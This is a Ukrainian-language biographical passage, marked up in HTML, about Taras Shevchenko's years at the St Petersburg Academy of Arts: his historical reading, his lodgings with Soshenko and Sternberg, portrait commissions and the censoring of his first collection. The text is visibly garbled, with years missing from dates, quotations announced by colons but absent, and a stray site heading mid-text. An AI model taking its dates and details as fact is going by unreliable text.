	<p>Яскраво змальована у Квітки, ця історична постать захопила Шевченка. У відтворенні образів минулого він надавав великого значення документальним даним. Казав про кобзарів:. Але оскільки йшлося про історичний матеріал, про знайомство з історією рідного краю, то саме тоді його загальні уявлення про минуле України, що їх перед тим мав лише на підставі народніх переказів, кобзарських дум і взагалі історичних пісень, почали набирати виразніших контурів.</p><a id='z3'></a><h3>Найпопулярніші книжки</h3><p>Маркевич був приятелем Гребінки. Шевченко опинився в атмосфері, де питання українського минулого зробилися предметом живих дискусій. Усі ці три історичні праці просякнуті були духом українсько-козацького патріотизму. У всіх трьох багато було поетичного, легендарного матеріалу. Усі три були не менш романтичні, ніж знані нашому молодому поетові поетично-історичні твори.</p>
<p>Вони переносили поета до яскравого, барвистого світу минулого, що був повним контрастом до тодішньої української дійсності, яка уявлялася йому якимсь тяжким сном. Від жовтня року до кінця січня року Шевченко жив разом із Сошенком на 4-ій лінії Василівського острова, на яку виходив і правий бічний фасад будинку Академії Мистецтв. Від січня року до літа жив разом із Штернберґом — в домі Аренса чи Арнста на 9-ій лінії Острова. Нараяв його Шевченкові інспектор Університету Фіцтум. Із згадок Шевченка про його спільне життя з Демським видно, що Демський давав йому лекції французької мови.</p>
<p>Демський мав твори Міцкевича й історичні праці Лелевеля. Живучи з ним разом, Шевченко мав нагоду познайомитися й з іншими творами польських письменників, бо польську мову вже знав. Демський мусів уступити своє місце Штернберґові. Про своє тодішнє спільне життя з ним Шевченко згадував пізніше із зворушенням і в далеких прикаспійських степах:. Уздовж передньої стіни над робочим столом висять дві полиці. Верхня заставлена статуетками й кониками барона Клодта, а нижня безладно завалена книжками.</p>
<p>Стіна, протилежна до напівзакритого єдиного вікна, завішена алебастровими зліпками стіп і ручок, а серед них красується маска Лаокоона й славної натурниці Фортунати. Оздоба незрозуміла для не-маляра! В додаток мені уявився той самий день, коли ми з небіжчиком Штернбергом за останні гроші купили собі просту робочу лампу, принесли її до нашої келії й серед білого дня засвітили, поставили серед стола і, як малі діти, тішилися нашим придбанням.</p>
<p>Декого з товаришів запросили полюбуватися нашим дивом і з того приводу втнули вечірку, себто чай з сухарями. Давнішу скромну кімнату Шевченка в домі Аренса, у якій жив він у кінці й на початку року, описав поміщик П. Мартос, з якого Шевченко малював тоді портрет аквареллю:. У такій скромній обстанові жив і творив Тарас Шевченко.</p>
<p>Тут відвідували його особи, з яких він малював портрети, що їх робив переважно аквареллю. Замовлень на портрети, мабуть, не бракувало, але непрактичний мистець-поет не завжди вмів витягти гроші від своїх клієнтів.</p>
		
	<p>Було це на початку року, мабуть десь у кінці січня. Штернберґ зробив для неї ілюстрацію — кобзаря з поводирем, репродуковану потім в офорті. Підписав його цензор П. Корсаков, що сам був письменником, бував на Україні й дуже цінив українську поезію. Як на тодішні обставини, Корсаков був дуже лагідним цензором.</p>
<p>Усе ж деякі уступи з тексту творів він усунув. Дещо усунув, мабуть, і сам Шевченко. Зайнятий працею в Академії, Тарас і далі не покидав літературної роботи. Уже в цьому щойно другому році академічної науки почав малювати олійними фарбами, напевне випередивши своїх товаришів. У цьому ж році він намалював і свій автопортрет, з усіма стилістичним прикметами портретів романтичної доби, випробовуючи, мабуть, ще нову для себе техніку олійного малювання.</p>
<p>Ця праця залишала йому ще час і для виконування приватних замовлень, про які була вже мова вище. У березні він мав змогу вислати братові Микиті 50 карб, асигнаціями. Коли мав гроші, витрачав їх на розваги. Бував часто в театрах і не жалував грошей на добре місце.</p>
